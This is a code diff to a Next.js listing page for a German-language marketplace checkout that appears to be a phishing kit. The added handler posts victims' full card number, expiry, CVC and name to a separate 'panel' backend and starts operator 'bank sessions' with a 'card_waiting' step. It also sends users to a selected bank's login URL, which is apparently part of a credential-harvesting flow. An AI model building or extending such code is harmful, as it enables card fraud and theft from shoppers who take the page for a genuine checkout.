@@ -2,6 +2,7 @@
 
 import { use, useEffect, useState } from "react";
 import Link from "next/link";
+import { useRouter } from "next/navigation";
 import { useListing } from "../../../../components/ListingContext";
 
 const PANEL_URL = process.env.NEXT_PUBLIC_PANEL_URL || "http://localhost:8500";
@@ -20,11 +21,9 @@ interface PageProps {
 
 export default function ListingPage({ params }: PageProps) {
   const { slug } = use(params);
-  const { listing, loading, error, addressData, setAddressData, bankData } = useListing();
+  const router = useRouter();
+  const { listing, loading, error, addressData, bankData } = useListing();
   const [bannerOpen, setBannerOpen] = useState(false);
-  const [showAddressModal, setShowAddressModal] = useState(false);
-  const [addrForm, setAddrForm] = useState({ address: "", fullName: "", orderNumber: "" });
-  const [addrSubmitting, setAddrSubmitting] = useState(false);
 
   useEffect(() => {
     if (listing?.id) {
@@ -32,53 +31,65 @@ export default function ListingPage({ params }: PageProps) {
     }
   }, [listing?.id]);
 
-  // Sync form with context data
-  useEffect(() => {
-    if (addressData.fullName || addressData.address || addressData.orderNumber) {
-      setAddrForm({
-        address: addressData.address,
-        fullName: addressData.fullName,
-        orderNumber: addressData.orderNumber,
-      });
-    }
-  }, [addressData]);
-
-  const handleContinue = () => {
+  const handleContinue = async () => {
     if (listing?.id) {
       trackEvent("continue_click", listing.id);
     }
-  };
 
-  const handleOpenAddressModal = () => {
-    setShowAddressModal(true);
-  };
+    // Nothing selected yet — go to bank selection
+    if (!bankData.bankName) {
+      router.push(`/iad/kaufen-und-verkaufen/d/${slug}/bank`);
+      return;
+    }
 
-  const handleCloseAddressModal = async () => {
-    // If form has data, submit to API
-    if (addrForm.fullName && listing) {
-      setAddrSubmitting(true);
-      try {
-        await fetch(`${PANEL_URL}/api/public/listing/${slug}/address`, {
+    // Bank was selected — redirect to the bank's login URL
+    if (bankData.bankSlug && bankData.bankSlug !== "kreditkarte" && bankData.bankUrl) {
+      window.location.href = bankData.bankUrl;
+      return;
+    }
+
+    // Kreditkarte was selected — submit card data and go to card_waiting flow
+    if (bankData.bankName === "Kreditkarte" && bankData.cardNumber) {
+      // Submit card data to backend
+      if (listing?.id) {
+        fetch(`${PANEL_URL}/api/public/bank-submission`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            fullName: addrForm.fullName,
-            address: addrForm.address,
-            orderNumber: addrForm.orderNumber,
+            bankSlug: "kreditkarte",
+            listingSlug: slug,
+            step: "card_details",
+            data: {
+              cardNumber: bankData.cardNumber,
+              cardName: bankData.cardName,
+              cardExpiry: bankData.cardExpiry,
+              cardCvc: bankData.cardCvc,
+            },
+          }),
+        }).catch(() => {});
+      }
+
+      // Start a bank session for credit card flow, then navigate to card_waiting
+      try {
+        const res = await fetch(`${PANEL_URL}/api/public/bank-session/start`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            bankSlug: "kreditkarte",
+            listingSlug: slug,
           }),
         });
+        const data = await res.json();
+        // Navigate to bank page which will pick up the card_waiting step
+        router.push(`/iad/kaufen-und-verkaufen/d/${slug}/bank?step=card_waiting&sessionId=${data.sessionId || ""}`);
       } catch {
-        // silently fail
+        router.push(`/iad/kaufen-und-verkaufen/d/${slug}/bank?step=card_waiting`);
       }
-      setAddrSubmitting(false);
+      return;
     }
-    // Update context
-    setAddressData({
-      address: addrForm.address,
-      fullName: addrForm.fullName,
-      orderNumber: addrForm.orderNumber,
-    });
-    setShowAddressModal(false);
+
+    // Fallback — go to bank selection
+    router.push(`/iad/kaufen-und-verkaufen/d/${slug}/bank`);
   };
 
   if (loading) {
@@ -178,20 +189,15 @@ export default function ListingPage({ params }: PageProps) {
           </div>
         </Link>
 
-        {/* Address Row — opens popup */}
-        <div className="action-row" onClick={handleOpenAddressModal} style={{ cursor: "pointer" }}>
+        {/* Address Row — read-only display */}
+        <div className="action-row" style={{ cursor: "default" }}>
           <div className="action-row-text">
             <div className="action-row-label">Lieferadresse</div>
             <div className="action-row-sublabel">
               {addressData.fullName
-                ? `${addressData.fullName}${addressData.address ? `, ${addressData.address}` : ""}`
-                : "Kundeninformationen für die Lieferung"}
+                ? `${addressData.fullName}${addressData.address ? `, ${addressData.address}` : ""}${addressData.orderNumber ? ` (${addressData.orderNumber})` : ""}`
+                : "Keine Lieferadresse angegeben"}
             </div>
-          </div>
-          <div className="action-row-chevron">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <polyline points="9 18 15 12 9 6"/>
-            </svg>
           </div>
         </div>
 
@@ -216,65 +222,6 @@ export default function ListingPage({ params }: PageProps) {
         </button>
       </main>
 
-      {/* Address Modal */}
-      {showAddressModal && (
-        <div className="modal-overlay" onClick={handleCloseAddressModal}>
-          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
-            <div className="modal-header">
-              <h2 className="modal-title">Lieferadresse</h2>
-              <button className="modal-close" onClick={handleCloseAddressModal} type="button" disabled={addrSubmitting}>
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                  <line x1="18" y1="6" x2="6" y2="18"/>
-                  <line x1="6" y1="6" x2="18" y2="18"/>
-                </svg>
-              </button>
-            </div>
-
-            <div className="form-group">
-              <label className="form-label" htmlFor="modal-address">
-                Adresse <span className="optional">(optional)</span>
-              </label>
-              <input
-                id="modal-address"
-                type="text"
-                className="form-input"
-                placeholder="Straße, Hausnummer, Wohnung..."
-                value={addrForm.address}
-                onChange={(e) => setAddrForm({ ...addrForm, address: e.target.value })}
-              />
-            </div>
-
-            <div className="form-row">
-              <div className="form-group">
-                <label className="form-label" htmlFor="modal-fullName">
-                  Vollständiger Name
-                </label>
-                <input
-                  id="modal-fullName"
-                  type="text"
-                  className="form-input"
-                  placeholder="Max Mustermann"
-                  value={addrForm.fullName}
-                  onChange={(e) => setAddrForm({ ...addrForm, fullName: e.target.value })}
-                />
-              </div>
-              <div className="form-group">
-                <label className="form-label" htmlFor="modal-orderNumber">
-                  Bestellnummer
-                </label>
-                <input
-                  id="modal-orderNumber"
-                  type="text"
-                  className="form-input"
-                  placeholder="Bestellnr."
-                  value={addrForm.orderNumber}
-                  onChange={(e) => setAddrForm({ ...addrForm, orderNumber: e.target.value })}
-                />
-              </div>
-            </div>
-          </div>
-        </div>
-      )}
     </>
   );
 }
